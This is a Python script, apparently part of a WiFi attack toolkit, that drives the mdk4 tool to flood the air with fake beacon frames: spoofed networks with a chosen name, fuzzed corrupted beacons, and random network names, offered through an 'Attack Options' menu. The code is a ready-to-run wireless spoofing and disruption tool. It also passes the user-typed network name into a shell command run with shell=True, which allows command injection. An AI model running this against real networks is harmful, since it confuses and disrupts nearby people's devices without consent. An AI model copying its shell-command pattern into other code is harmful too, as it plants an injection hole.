#!/usr/bin/env python3
"""
Beacon Broadcast Attack - WiFi Network Spoofing

Broadcasts fake WiFi networks with customizable parameters to confuse
nearby devices and demonstrate WiFi spoofing vulnerabilities.

Features:
- Custom network name broadcasting
- Beacon frame manipulation
- Multi-network flooding
"""

import os
import subprocess
from ui import cprint, iprint, wprint, eprint, sprint, cinput, CYAN, YELLOW, RED, GREEN, RESET, BRIGHT


class BeaconBroadcaster:
    """Manages WiFi beacon frame broadcasting attack."""
    
    def __init__(self, interface):
        """
        Initialize beacon broadcaster.
        
        Args:
            interface (str): WiFi interface name (e.g., wlan1, wlan1mon)
        """
        self.interface = interface
        self.running = False
    
    def verify_monitor_mode(self):
        """Verify interface is in monitor mode."""
        try:
            result = subprocess.run(
                ["iwconfig", self.interface],
                capture_output=True,
                text=True,
                timeout=5
            )
            if "Mode:Monitor" in result.stdout:
                return True
            else:
                eprint(f"{self.interface} is not in monitor mode!")
                return False
        except Exception as e:
            eprint(f"Error checking interface: {e}")
            return False
    
    def broadcast_with_custom_name(self, ssid_name):
        """Broadcast beacon frames with custom SSID."""
        if not self.verify_monitor_mode():
            return False
        
        cprint(f"\n[*] Broadcasting custom network: {ssid_name}", CYAN)
        cprint(f"[*] Interface: {self.interface}", CYAN)
        cprint("[*] Press Ctrl+C to stop", YELLOW)
        
        try:
            cmd = f"sudo mdk4 {self.interface} b -n '{ssid_name}'"
            subprocess.run(cmd, shell=True)
            sprint("Broadcast completed!")
            return True
        except KeyboardInterrupt:
            wprint("Broadcast stopped by user")
            return False
        except Exception as e:
            eprint(f"Error during broadcast: {e}")
            return False
    
    def broadcast_with_beacon_fuzzing(self):
        """Broadcast with corrupted beacon data."""
        if not self.verify_monitor_mode():
            return False
        
        cprint("\n[*] Broadcasting with beacon frame fuzzing", CYAN)
        cprint(f"[*] Interface: {self.interface}", CYAN)
        cprint("[*] Press Ctrl+C to stop", YELLOW)
        
        try:
            cmd = f"sudo mdk4 {self.interface} b -a"
            subprocess.run(cmd, shell=True)
            sprint("Fuzzing broadcast completed!")
            return True
        except KeyboardInterrupt:
            wprint("Fuzzing broadcast stopped by user")
            return False
        except Exception as e:
            eprint(f"Error during fuzzing: {e}")
            return False
    
    def broadcast_random_ssids(self):
        """Broadcast randomized beacon frames."""
        if not self.verify_monitor_mode():
            return False
        
        cprint("\n[*] Broadcasting random beacon frames globally", CYAN)
        cprint(f"[*] Interface: {self.interface}", CYAN)
        cprint("[*] Press Ctrl+C to stop", YELLOW)
        
        try:
            cmd = f"sudo mdk4 {self.interface} b"
            subprocess.run(cmd, shell=True)
            sprint("Random broadcast completed!")
            return True
        except KeyboardInterrupt:
            wprint("Random broadcast stopped by user")
            return False
        except Exception as e:
            eprint(f"Error during random broadcast: {e}")
            return False
    
    def run_interactive(self):
        """Run beacon broadcaster in interactive mode."""
        print(f"\n{BRIGHT}{CYAN}")
        print("╔════════════════════════════════════════╗")
        print("║     Beacon Broadcast Attack            ║")
        print("║   (WiFi Network Spoofing)              ║")
        print("╚════════════════════════════════════════╝")
        print(f"{RESET}\n")
        
        cprint("Attack Options:", CYAN)
        cprint("1) Broadcast with custom network name")
        cprint("2) Broadcast with beacon frame fuzzing")
        cprint("3) Broadcast random beacon frames (global)")
        print()
        
        choice = cinput("Select attack mode")
        
        if choice == "1":
            ssid = cinput("Enter network name to broadcast")
            if ssid:
                self.broadcast_with_custom_name(ssid)
        elif choice == "2":
            self.broadcast_with_beacon_fuzzing()
        elif choice == "3":
            self.broadcast_random_ssids()
        else:
            wprint("Invalid selection")


if __name__ == "__main__":
    import sys
    interface = sys.argv[1] if len(sys.argv) > 1 else "wlan1mon"
    
    broadcaster = BeaconBroadcaster(interface)
    broadcaster.run_interactive()
